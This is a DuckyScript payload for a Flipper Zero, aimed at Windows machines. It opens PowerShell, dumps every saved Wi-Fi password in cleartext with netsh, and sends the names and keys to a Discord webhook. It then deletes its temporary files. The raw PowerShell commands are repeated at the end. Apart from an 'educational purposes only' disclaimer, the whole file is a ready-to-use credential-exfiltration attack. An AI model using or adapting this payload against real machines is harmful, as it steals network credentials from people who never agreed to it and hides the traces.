REM This script is a ducky script to be run on a windows machine with a Flipper Zero
REM It contains a powershell script that exports all saved wifi passwords to a discord webhook
REM This script is for educational purposes only

REM This version of the script should work on any duckyscript compatible device
REM However, it was only tested on a Flipper Zero

REM Opening powershell from the run menu
    GUI r
    DELAY 750
    STRING powershell
    ENTER

REM Writing the powershell script
REM delay of 2 seconds to make sure powershell is open
    DELAY 1000

REM Creating a temporary directory and changing to it
    STRING $p="$env:temp\p";md $p >$null;cd $p;
    ENTER

REM Exporting all saved wifi passwords to xml files in the temporary directory
    STRING netsh wlan export profile key=clear >$null;
    ENTER


REM Getting the names and passwords of all the saved wifi networks from the xml files and storing them in a variable
    STRING $r=ls|%{$Xml=[xml](gc $_.FullName);[PSCustomObject]@{Name=$Xml.WLANProfile.Name;Password=$Xml.WLANProfile.MSM.Security.SharedKey.KeyMaterial}};
    ENTER


REM Creating the body of the discord webhook message (the message is formatted as a Markdown code block to make it easier to read)
    STRING $body=@{content="``````"+($r|ft|Out-String)+"``````"} | ConvertTo-Json
    ENTER
    
    STRING $url='https://discord.com/api/webhooks/<channel_id>/<webhook_id>'
    ENTER

REM Sending the body to the discord webhook
    STRING Invoke-RestMethod -Uri $url -Method post -Body $body -ContentType 'application/json' >$null;
    ENTER


REM Deleting the temporary directory and exiting powershell
    STRING cd ..;rm $p -r -fo;exit;
    ENTER

$p="$env:temp\p";md $p >$null;cd $p;
netsh wlan export profile key=clear >$null;
$r=ls|%{$Xml=[xml](gc $_.FullName);[PSCustomObject]@{Name=$Xml.WLANProfile.Name;Password=$Xml.WLANProfile.MSM.Security.SharedKey.KeyMaterial}};
$body=@{content="``````"+($r|ft|Out-String)+"``````"} | ConvertTo-Json
$url='https://discord.com/api/webhooks/<channel_id>/<webhook_id>'
Invoke-RestMethod -Uri $url -Method post -Body $body -ContentType 'application/json' >$null;
cd ..;rm $p -r -fo;exit;
